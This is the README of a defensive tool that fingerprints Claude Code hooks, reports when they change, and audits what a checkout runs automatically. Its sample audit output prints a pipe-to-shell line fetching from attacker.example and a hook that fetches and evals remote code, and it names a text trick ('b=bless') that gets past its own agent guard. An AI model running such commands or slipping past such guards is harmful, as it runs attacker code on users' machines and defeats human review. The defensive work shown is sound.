<h1 align="center">hook-integrity-kit</h1>

<p align="center">Know when the hooks Claude Code runs for you have changed.</p>

hook-integrity-kit records a fingerprint of every Claude Code hook you have reviewed, then
tells you, file by file, when one of them changes.

A hook is a script Claude Code runs with your permissions, at session start and before tool
calls. Anyone who can change that script (a pull, a dependency's install script, an agent
mid-session) can run code on your machine. If other people, tools or agents write to a
repository you open in Claude Code, this is for you.

```console
$ hook-integrity-kit verify
hook-integrity: DRIFT - the hook surface no longer matches the baseline:
  x MODIFIED   .claude/hooks/greet.sh
```

Designed for:

- **Claude Code.** You need it. The hooks this tool fingerprints are the ones Claude Code runs. Only
  `audit` is useful without it: it lists what a checkout runs on its own, in VS Code and devcontainers too.
- **A person who reads the hooks.** You need one. `bless` records what was reviewed, so a baseline is
  only as good as the review, and the guards refuse `bless` from an agent.
- **`verify` from a shell or CI.** You need it for real protection. The session-start check is itself a
  hook: it reports tampering after a malicious hook has run, and `disableAllHooks` turns it off.
- **Git, to share the baseline.** Commit `.claude/hook-integrity.json` so every checkout compares
  against the same review.

Python standard library only, Python 3.11 to 3.14, no network.

## Quick start

```sh
pip install git+https://github.com/lockesec/hook-integrity-kit
hook-integrity-kit install   # prints a settings snippet to merge into .claude/settings.json
hook-integrity-kit bless     # after you read every hook: record them as reviewed
git add .claude/hook-integrity.json
```

Read [docs/install.md](docs/install.md) before you merge the snippet. Its guards use
`"onFailure": "block"` (Claude Code 2.1.295+), and the page says how to recover.

To try it on a throwaway project, clone the repo and run `sh examples/demo.sh`. An excerpt
(a test checks each output line against a real run):

```console
$ hook-integrity-kit bless
  57aa9f5e137e  .claude/hooks/greet.sh  [SessionStart]
$ # tamper: append a line to the hook that posts your environment to attacker.example
$ hook-integrity-kit verify
hook-integrity: DRIFT - the hook surface no longer matches the baseline:
  x MODIFIED   .claude/hooks/greet.sh
If YOU made these changes: review the diff, then run `hook-integrity-kit bless`.
If you did NOT: treat this as a possible hook-injection compromise and inspect the files before running anything else.
```

`verify` exits 1 on drift. The full demo also registers a second hook and shows `verify`
naming the settings change.

## How it works

| When | Command | What it does |
|---|---|---|
| Setup | `install` | Prints a `hooks` block: a session-start check and three guards that run before each tool call. Writes nothing. |
| After review | `bless` | Records a SHA-256 of each hook, the project files it runs, what Python imports for it, and the settings `hooks` and `env` blocks. Lists every file. |
| Any time | `verify` | Compares the project with that baseline: on demand, in CI, and at session start. |
| Every tool call | `check-command`, `check-write`, `check-gate-config` | Refuse dangerous shell commands, changes to hook registrations, self-blessing and weakened test configs, and tell the agent to ask you. |
| A hook changed on purpose | `bless --diff` | Writes the new baseline and prints what changed, with the git diff. |
| Before opening a stranger's checkout | `audit` | Needs no baseline. Lists what the checkout would run on its own. |

The step-by-step walkthrough and a guard's refusal message are in
[docs/how-it-works.md](docs/how-it-works.md). Every command's checks are in
[docs/commands.md](docs/commands.md).

### Before you open a checkout you did not write

`audit` writes nothing. It lists what a checkout runs on its own when an agent or editor
opens it: Claude Code hooks (plugin hooks too, and what they reach through other scripts), project MCP
servers, VS Code folder-open tasks and devcontainer commands. It also flags a config that turns guard rules off. On a replay of the Mini Shai-Hulud npm worm (2026-05), from the test suite:

```console
$ hook-integrity-kit audit
AUTO-RUN Claude Code hook SessionStart (.claude/settings.json): node .claude/setup.mjs
  ! .claude/setup.mjs:1 fetches from the network (fetch) and runs code at line 1 (eval)
  ? runs when a session starts, before the first prompt
AUTO-RUN VS Code task 'setup' (.vscode/tasks.json): curl -s https://attacker.example/i.sh | sh
  ! runs when the folder opens (runOn: folderOpen)
  ! pipe-to-shell: downloaded content piped straight into a shell or interpreter
audit: 2 item(s) run on their own, 2 flagged
```

`!` lines fail the audit (exit 1); `?` lines are for review. To fail on anything that runs
unasked, flagged or not (a CI gate, or a check before you open a checkout), add `--strict`. The
[case-studies](https://github.com/lockesec/case-studies) Mini Shai-Hulud write-up re-runs
this tool.

## What it protects against

Claude Code runs a project's hooks without asking, and the next session runs whatever the
script says now. A hook can change when:

- a pull, a merge or a dependency's install script rewrites it;
- a helper module it imports changes while the hook file does not;
- an agent adds a registration mid-session;
- `settings.local.json` (not committed, rarely reviewed) gains a `hooks` block.

Eight attacks on this surface, most of them published, are replayed with inert files in
[examples/attacks/](examples/attacks/corpus.py).
[docs/attack-coverage.md](docs/attack-coverage.md) shows, per attack, what `audit` and
`verify` report and what neither covers; a test fails if the table and the code disagree.
Background: [DESIGN.md](DESIGN.md#why-it-exists).

## Why you can trust it

1. **What `bless` lists is what gets checked.** A change to a listed file or pinned settings
   key is named by `verify`. Add anything else with `integrity.extra_files`.
2. **Gaps are printed, not hidden.** What it can see but not hash (dynamic imports, installed
   plugins, user-level and managed settings, scripts outside the project) is a `NOT CHECKED` line on
   every `bless` and `verify`, and in a session-start drift report. A clean session start prints
   only a new unregistered hook file, a script outside the project or a global change. On one real 63-hook project, `bless` printed 83. "OK" means nothing on the list
   changed, not that every file a hook might load is covered.
3. **No clean verdict without a look.** No baseline, an unreadable settings file, a missing
   script or an unparsable Python hook exits 2 with the cause.
4. **The guards refuse the plain ways to re-bless; they are an accident guard.** They refuse
   `hook-integrity-kit bless`, the common shell commands that would rewrite the baseline, and
   Write/Edit calls on the baseline, the kit's config and the `hooks` block. A determined agent
   can get around a text match (`b=bless; hook-integrity-kit $b` passes), so the baseline is
   committed and its changes are reviewed like code ([THREAT_MODEL.md](THREAT_MODEL.md)).
5. **Guards fail closed.** An internal error refuses the call; `onFailure: block` covers a
   guard that times out or cannot start. A payload that is not a JSON object is refused. Rule matching
   is linear in command length or capped by a work budget that denies, and a command over 4 MiB is
   refused ([DESIGN.md](DESIGN.md)).
6. **Planted modules do not load.** The hook command drops relative `sys.path` entries, so a
   `json.py` or `hook_integrity_kit/` in the project cannot replace the guards (tested).
7. **Tested in CI** on Python 3.11 to 3.14; each review finding was pinned to a test before
   its fix ([DESIGN.md](DESIGN.md)).

Each point in full: [docs/how-it-works.md](docs/how-it-works.md#why-you-can-trust-it).

## Exit codes

`verify`, `bless` and `audit`: **0** clean (or baseline written) · **1** drift or findings,
each named · **2** NOT EVALUABLE: it could not check, and says why · **64** usage error.

The `check-*` guards follow Claude Code's hook contract: **2** blocks the tool call, **0**
allows it, and a guard that cannot judge also exits 2. `session-start` always exits 0.
`NOT CHECKED` lines never change an exit code.
Per command: [docs/rules.md](docs/rules.md#exit-codes-per-command).

## Where it falls short

- **No catch rate has been measured.** It tells you a hook changed, not whether the hook is malicious.
- **It reports after the fact.** A malicious hook on the same event has already run by session start. Run `verify` from a shell or CI before opening an untrusted checkout.
- **A baseline is only as good as the review behind `bless`.** One that arrives with a clone is the author's claim, not yours.
- **Shell guards match text.** They are a seatbelt, not a sandbox, and they judge only the Bash tool unless you name others in `commands.shell_tools`.
- **Some surfaces are named, not hashed:** installed plugins, user-level hooks and scripts outside the project.

How it was checked, known holes and what is untested: [docs/limits.md](docs/limits.md).

## Prior art and credits

Developed in a private AI-experimentation environment and extracted as a standalone tool.
The maintainer designed and directed it. Much of the code was written with AI coding agents,
and separate AI sessions reviewed it adversarially; the tests and [DESIGN.md](DESIGN.md) show
what was checked.

- **[cc-safety-net]** (MIT) guards destructive shell commands in Claude Code. The shell rules
  here cover similar ground, with `rm`, `chmod` and `git push` matched argument by argument.
  No code was taken from it. New here: the baseline over hooks, the files they run, their
  Python imports and bytecode caches; explicit `NOT CHECKED` and exit-2 states; and write
  rules that keep the `hooks` block and baseline out of an agent's hands.
- **[everything-claude-code (ECC)]** by Affaan Mustafa (MIT, notice in [NOTICE](NOTICE)):
  the gate-config hook is *adapted* from its `config-protection.js`, and the hook-profile
  vocabulary follows its `hook-flags.js`.
- **Check Point Research** (Aviv Donenfeld, Oded Vanunu), [RCE and API token exfiltration
  through Claude Code project files][checkpoint]: the threat the kit is built around.
- **Anthropic, [Claude Code hooks reference][hooks]**: the contract the guards implement.

Attribution corrections are welcome; please open an issue.

## Docs

- [docs/how-it-works.md](docs/how-it-works.md): the workflow, a guard's message, trust in full
- [docs/commands.md](docs/commands.md): what each command checks or refuses
- [docs/coverage.md](docs/coverage.md): what the baseline covers, and what it does not
- [docs/rules.md](docs/rules.md): rules, options, configuration, the hook protocol
- [docs/limits.md](docs/limits.md): every known limit
- [docs/install.md](docs/install.md): the snippet, `onFailure: block`, recovery
- [THREAT_MODEL.md](THREAT_MODEL.md) and [DESIGN.md](DESIGN.md): scope, contract, design decisions

## License

Apache-2.0 - see [LICENSE](LICENSE) and [NOTICE](NOTICE). Material derived from ECC remains
under its MIT License; the notice is in NOTICE.

[everything-claude-code (ECC)]: https://github.com/affaan-m/ECC
[checkpoint]: https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/
[hooks]: https://code.claude.com/docs/en/hooks
[cc-safety-net]: https://github.com/kenryu42/cc-safety-net
